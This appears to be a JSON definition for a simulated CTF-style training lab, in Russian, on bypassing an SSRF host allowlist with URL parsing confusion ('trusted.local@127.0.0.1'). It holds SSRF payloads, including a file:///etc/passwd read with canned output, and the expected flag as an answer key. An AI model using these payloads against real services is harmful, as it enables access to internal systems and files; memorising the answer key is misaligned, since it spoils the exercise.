@@ -1,0 +1,23 @@
+{
+  "id": "web-url-parsing",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": { "file": "/home/student/task/found.txt", "contains": "nto{url_p4rs1ng_4t_byp4ss_ssrf}" },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    { "path": "/home/student/task/task.md", "text": "# Практика: URL parsing confusion (SSRF bypass)\n\n`proxy.local/preview` разрешает только `trusted.local`. Парсеры URL\nрасходятся в том, где хост: часть после `@` — настоящий хост.\n\n1. Прямой чужой домен отсекается:\n\n   curl -s 'https://proxy.local/preview?url=https://evil.local/'\n\n2. Обойди allowlist через `@` и дойди до внутренней админки:\n\n   curl -s 'https://proxy.local/preview?url=https://trusted.local@127.0.0.1:8080/admin'\n\n3. Флаг — в ответе внутреннего сервиса. Запиши в `found.txt` и набери `check`.\n" }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция proxy.local/preview)",
+      "cases": [
+        { "match": "127\\.0\\.0\\.1", "example": "-s 'https://proxy.local/preview?url=https://trusted.local@127.0.0.1:8080/admin'", "output": "{\"preview\":\"<html><title>Internal Admin</title>\\nnto{url_p4rs1ng_4t_byp4ss_ssrf}\"}\n" },
+        { "match": "file://", "example": "-s 'https://proxy.local/preview?url=file:///etc/passwd'", "output": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n" },
+        { "match": "@evil\\.local|%40evil", "example": "-s 'https://proxy.local/preview?url=https://trusted.local@evil.local/'", "output": "{\"preview\":\"<html><title>evil.local</title></html>\"}\n" },
+        { "match": "evil\\.local", "example": "-s 'https://proxy.local/preview?url=https://evil.local/'", "output": "{\"error\":\"host not allowed\"}\n" },
+        { "match": "trusted\\.local", "example": "-s 'https://proxy.local/preview?url=https://trusted.local/page'", "output": "{\"preview\":\"<html><title>trusted.local</title></html>\"}\n" }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только /preview на proxy.local.\n"
+    }
+  }
+}
